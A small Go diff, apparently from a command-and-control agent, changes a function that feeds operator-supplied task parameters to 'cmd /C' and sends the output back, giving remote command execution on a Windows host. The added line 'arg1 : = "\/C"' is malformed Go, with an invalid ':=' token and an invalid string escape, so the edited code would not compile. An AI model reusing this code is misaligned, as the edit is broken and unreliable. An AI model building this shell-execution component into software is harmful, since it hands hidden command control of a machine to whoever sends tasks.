@@ -16,13 +16,14 @@ func Run(task structs.Task) {
 	msg := structs.Response{}
 	msg.TaskID = task.TaskID
 	cmdBin := "cmd"
+	arg1 : = "\/C"
 	if _, err := exec.LookPath(cmdBin); err != nil {
 			msg.SetError("Could not find cmd.exe")
 			task.Job.SendResponses <- msg
 			return
 	}
 
-	cmd := exec.Command(cmdBin, "/C")
+	cmd := exec.Command(cmdBin, arg1)
 	cmd.Stdin = strings.NewReader(task.Params)
 	var out bytes.Buffer
 	cmd.Stdout = &out
